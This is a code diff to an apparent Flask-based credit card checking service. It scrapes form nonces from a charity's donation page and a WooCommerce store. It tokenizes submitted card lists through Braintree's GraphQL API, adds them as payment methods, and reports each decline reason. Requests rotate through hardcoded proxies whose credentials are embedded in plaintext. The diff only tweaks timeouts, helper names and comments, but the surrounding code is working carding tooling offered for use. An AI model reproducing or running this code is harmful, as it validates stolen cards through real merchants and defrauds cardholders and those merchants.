@@ -10,7 +10,7 @@ import base64
 
 app = Flask(__name__)
 
-REQUEST_TIMEOUT = 500
+REQUEST_TIMEOUT = 1000
 PROXIES = [
     'http://purevpn0s11664812:5TUjjTyn6G6DJl@px591701.pointtoserver.com:10780',
     'http://purevpn0s11664812:5TUjjTyn6G6DJl@px591801.pointtoserver.com:10780',
@@ -37,6 +37,10 @@ def generate_random_account():
     name = ''.join(random.choices(string.ascii_lowercase, k=10))
     number = ''.join(random.choices(string.digits, k=4))
     return f"{name}{number}@gmail.com"
+
+def generate_random_string(length):
+    characters = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
 
 def clean_response(raw_msg: str) -> str:
     return BeautifulSoup(raw_msg, "html.parser").get_text().strip()
@@ -105,11 +109,9 @@ def check_card_gate2():
                 'user-agent': user_agent,
             }
 
-            # Fetch nonce
             response = r.get('https://www.angelflightab.ca/donate/', headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxy)
             nonce = gets(response.text,'"validate_form_nonce":"','"')
 
-            # Post form - step 2
             files = {
                 'input_10': (None, '‬‏'),
                 'input_1': (None, acc),
@@ -138,7 +140,6 @@ def check_card_gate2():
             }
             response = r.post('https://www.angelflightab.ca/donate/', headers=headers, files=files, timeout=REQUEST_TIMEOUT, proxies=proxy)
 
-            # Post admin ajax - step 3
             headers_ajax = {
                 'accept': '*/*',
                 'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -286,8 +287,8 @@ def b3_npnbet():
     
     # 1. Get random user details
     r0 = session.get('https://randomuser.me/api/1.2/?nat=us', headers=headers, proxies=proxies, verify=False)
-    postcode = get_str(r0.text, '"postcode":', ',"')
-    street = get_str(r0.text, '"street":"', '"')
+    postcode = gets(r0.text, '"postcode":', ',"')
+    street = gets(r0.text, '"street":"', '"')
 
     # 2. Get registration nonce
     r1 = session.get('https://www.calipercovers.com/my-account/', headers=headers, proxies=proxies, verify=False)
@@ -306,9 +307,9 @@ def b3_npnbet():
     anonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', r2.text)
     anonce = anonce_match.group(1) if anonce_match else ''
 
-    T = get_str(r2.text, 'var wc_braintree_client_token = ["', '"]')
+    T = gets(r2.text, 'var wc_braintree_client_token = ["', '"]')
     TK = base64.b64decode(T).decode() if T else ''
-    au = get_str(TK, '"authorizationFingerprint":"', '",')
+    au = gets(TK, '"authorizationFingerprint":"', '",')
 
     # 4. Tokenize Card via GraphQL
     graphql_json = {
@@ -335,7 +336,7 @@ def b3_npnbet():
         "Braintree-Version": "2018-05-10"
     }
     r5 = session.post('https://payments.braintree-api.com/graphql', json=graphql_json, headers=graphql_headers, proxies=proxies, verify=False)
-    token = get_str(r5.text, '"token":"', '"')
+    token = gets(r5.text, '"token":"', '"')
 
     # 5. Add payment method
     post_data_5 = {
@@ -350,7 +351,7 @@ def b3_npnbet():
     }
     r6 = session.post('https://www.calipercovers.com/my-account/add-payment-method/', data=post_data_5, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}, proxies=proxies, verify=False)
 
-    raw_msg = get_str(r6.text, 'There was an error saving your payment method. Reason: ', '</div>')
+    raw_msg = gets(r6.text, 'There was an error saving your payment method. Reason: ', '</div>')
     clean_msg = raw_msg.strip()
 
     if clean_msg:
@@ -370,9 +371,8 @@ def b3_npnbet():
         "lista": lista,
         "Status": status,
         "Response": message,
-        "Took": format_decimal(elapsed),
+        "Took": "{:.2f}".format(elapsed),
     })
-
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
